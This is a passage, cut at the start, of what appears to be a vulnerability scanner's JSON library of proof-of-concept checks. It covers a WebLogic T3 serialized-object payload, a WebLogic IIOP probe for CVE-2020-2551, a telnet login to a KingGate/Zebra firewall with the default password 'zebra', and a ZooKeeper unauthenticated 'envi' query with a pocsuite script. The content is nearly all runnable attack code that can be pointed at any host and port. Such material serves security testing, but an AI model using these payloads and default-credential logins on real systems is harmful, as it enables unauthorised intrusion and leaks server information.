2e696e7465726e616c2e56657273696f6e496e666f972245516452463e0200035b00087061636b6167657371'\n            data2 = '007e00034c000e72656c6561736556657273696f6e7400124c6a6176612f6c616e672f537472696e673b5b001276657273696f6e496e666f417342797465737400025b42787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c6571007e00054c000a696d706c56656e646f7271007e00054c000b696d706c56657273696f6e71007e000578707702000078fe00fffe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c000078707750210000000000000000000d3139322e3136382e312e323237001257494e2d4147444d565155423154362e656883348cd6000000070000{0}ffffffffffffffffffffffffffffffffffffffffffffffff78fe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c0000787077200114dc42bd07'.format(\n                '{:04x}'.format(port))\n            data3 = '1a7727000d3234322e323134'\n            data4 = '2e312e32353461863d1d0000000078'\n            for d in [data1, data2, data3, data4]:\n                sock.send(binascii.unhexlify(d))\n            time.sleep(2)\n            print(' ...接收长度: {0}'.format(len(sock.recv(2048))))\n\n        def sendEvilObjData(sock, data):\n            payload = '056508000000010000001b0000005d010100737201787073720278700000000000000000757203787000000000787400087765626c6f67696375720478700000000c9c979a9a8c9a9bcfcf9b939a7400087765626c6f67696306fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200025b42acf317f8060854e002000078707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200106a6176612e7574696c2e566563746f72d9977d5b803baf010300034900116361706163697479496e6372656d656e7449000c656c656d656e74436f756e745b000b656c656d656e74446174617400135b4c6a6176612f6c616e672f4f626a6563743b78707702000078fe010000'\n            payload += data\n            payload += 'fe010000aced0005737200257765626c6f6769632e726a766d2e496d6d757461626c6553657276696365436f6e74657874ddcba8706386f0ba0c0000787200297765626c6f6769632e726d692e70726f76696465722e426173696353657276696365436f6e74657874e4632236c5d4a71e0c0000787077020600737200267765626c6f6769632e726d692e696e7465726e616c2e4d6574686f6444657363726970746f7212485a828af7f67b0c000078707734002e61757468656e746963617465284c7765626c6f6769632e73656375726974792e61636c2e55736572496e666f3b290000001b7878fe00ff'\n            payload = '{0:08x}{1}'.format(int(len(payload)/2 + 4), payload)\n            sock.send(binascii.unhexlify(payload))\n            time.sleep(2)\n            sock.send(binascii.unhexlify(payload))\n            res = ''\n            try:\n                while True:\n                    res = sock.recv(4096).decode('utf-8', 'ignore')\n                    time.sleep(0.1)\n                    if re.findall(VER_SIG[index], res, re.S):\n                        break\n            except Exception as e:\n                pass\n            return res\n\n        socket.setdefaulttimeout(30)\n        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        server_addr = (host, port)\n        print('[+][{0}]发送t3握手包'.format(host))\n        t3handshake(sock, server_addr)\n        print('[+][{0}]建立t3请求对象'.format(host))\n        buildT3RequestObject(sock, port)\n        print('[+][{0}]发送恶意请求包'.format(host))\n        rs = sendEvilObjData(sock, PAYLOAD[index])\n        m = re.findall(VER_SIG[index], rs, re.S)\n        if len(m) > 0:\n            pocdict['isvul'] = True\n            pocdict['payload'] = str(binascii.unhexlify(PAYLOAD[0]))\n            pocdict['proof'] = m\n            pocdict['response'] = str(rs)\n\n    except Exception as e:\n        pocdict['exception'] = str(e)\n    vulns.append(pocdict)\n_verify(self.host, self.port, self.vulns)",
            "exp": "",
            "sysname": "weblogic",
            "param": "ip:port",
            "level": "high",
            "extfile": ""
        },
        {
            "vulname": "weblogic_wls_iiop_rce",
            "description": "Weblogic WLS组件IIOP远程代码执行(CVE-2020-2551)",
            "poc": "def _verify(host, port, vulns):\n    defaultport = 7001\n    pocdict = {\n        \"vulnname\":\"weblogic_wls_iiop_rce\",\n        \"isvul\": False,\n        \"vulnhost\":host,\n        \"vulnport\":port,\n        \"payload\":\"\",\n        \"proof\":\"\",\n        \"response\":\"\",\n        \"exception\":\"\",\n    }\n    port = int(port)\n    try:\n        socket.setdefaulttimeout(8)\n        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        payload = bytes.fromhex('47494f50010200030000001700000002000000000000000b4e616d6553657276696365')\n        sock.connect((host, port))\n        sock.send(payload)\n        response = sock.recv(20)\n        if b'GIOP' in response:\n            pocdict['isvul'] = True\n            pocdict['payload'] = str(payload)\n            pocdict['proof'] = 'GIOP'\n            pocdict['response'] = str(response)\n\n    except Exception as e:\n        pocdict['exception'] = str(e)\n    vulns.append(pocdict)\n_verify(self.host, self.port, self.vulns)",
            "exp": "",
            "sysname": "weblogic",
            "param": "ip:port",
            "level": "high",
            "extfile": ""
        },
        {
            "vulname": "zebra_default_conf",
            "description": "KingGate防火墙默认配置漏洞",
            "poc": "def _verify(host, port, vulns):\n    defaultport = 2601\n    pocdict = {\n        \"vulnname\":\"zebra_default_conf\",\n        \"isvul\": False,\n        \"vulnhost\":host,\n        \"vulnport\":port,\n        \"payload\":\"\",\n        \"proof\":\"\",\n        \"response\":\"\",\n        \"exception\":\"\",\n    }\n    port = int(port)\n    try:\n        # 连接Telnet服务器\n        tlib = telnetlib.Telnet(host, port, timeout=8)\n        # tlib.set_debuglevel(2)\n        # 登陆\n        tlib.read_until(b\"Password:\", timeout=8)\n        tlib.write(b\"zebra\\r\\n\")\n        result = tlib.read_until(b\"zrinfo>\", timeout=8)\n        tlib.close()\n        if result.find(b\"zrinfo>\") != -1:\n            pocdict['isvul'] = True\n            pocdict['payload'] = 'zebra'\n            pocdict['proof'] = 'zrinfo internal'\n            pocdict['response'] = result\n\n    except Exception as e:\n        pocdict['exception'] = str(e)\n    vulns.append(pocdict)\n_verify(self.host, self.port, self.vulns)",
            "exp": "",
            "sysname": "zebra",
            "param": "ip:port",
            "level": "high",
            "extfile": ""
        },
        {
            "vulname": "zookeeper_unauth",
            "description": "zookeeper 未授权漏洞",
            "poc": "def _verify(host, port, vulns):\n    defaultport = 2181\n    pocdict = {\n        \"vulnname\":\"zookeeper_unauth\",\n        \"isvul\": False,\n        \"vulnhost\":host,\n        \"vulnport\":port,\n        \"payload\":\"\",\n        \"proof\":\"\",\n        \"response\":\"\",\n        \"exception\":\"\",\n    }\n    port = int(port)\n    try:\n        socket.setdefaulttimeout(8)\n        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        payload = '\\x65\\x6e\\x76\\x69\\x0a'\n        sock.connect((host, port))\n        sock.send(payload.encode())\n        response = sock.recv(1024).decode()\n        sock.close()\n        if r\"Environment\" in response and r\"zookeeper\" in response:\n            pocdict['isvul'] = True\n            pocdict['payload'] = payload\n            pocdict['proof'] = 'Environment found'\n            pocdict['response'] = response\n\n    except Exception as e:\n        pocdict['exception'] = str(e)\n    vulns.append(pocdict)\n_verify(self.host, self.port, self.vulns)",
            "exp": "#!/usr/bin/env python\n# coding: utf-8\nimport socket\nimport urlparse\nfrom pocsuite.api.poc import register\nfrom pocsuite.api.poc import Output, POCBase\n\nclass TestPOC(POCBase):\n    vulID = '0'\n    version = '1.0'\n    author = 'hancool'\n    vulDate = '2018-12-25'\n    createDate = '2018-12-25'\n    updateDate = '2018-12-25'\n    references = ['',]\n    name = 'Apache ZooKeeper unauthorized access'\n    appPowerLink = ''\n    appName = 'zookeeper'\n    appVersion = 'All'\n    vulType = 'Unauthorized'\n    desc = '''\n    Apache Zookeeper安装部署之后默认情况下不需要身份认证，攻击者可通过该漏洞泄露服务器的敏感信息。\n    '''\n\n    def _verify(self):\n        result = {}\n        pr = urlparse.urlparse(self.url)\n        if pr.port:  # and pr.port not in ports:\n            ports = [pr.port]\n        else:\n            ports = [2181,12181,22181]\n        for port in ports:\n            try:\n                s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)\n                s.connect((pr.hostname,port))\n                s.send('envi')\n                info = s.recv(4096)\n                if 'zookeeper.version' in info:\n                    result['VerifyInfo'] = {}\n                    result['VerifyInfo']['URL'] = '{}:{}'.format(pr.hostname,port)\n                    result['extra'] = {}\n                    result['extra']['evidence'] = info.strip()\n                    break\n            except:\n                #raise\n                pass\n\n        return self.parse_output(result)\n\n    def _attack(self):\n        return self._verify()\n\n    def parse_output(self, result):\n        output = Output(self)\n        if result:\n            output.success(result)\n        else:\n            output.fail('not vulnerability')\n        return output\n\nregister(TestPOC)",
            "sysname": "zookeeper",
            "param": "ip:port",
            "level": "high",
            "extfile": ""
        }
    ]
}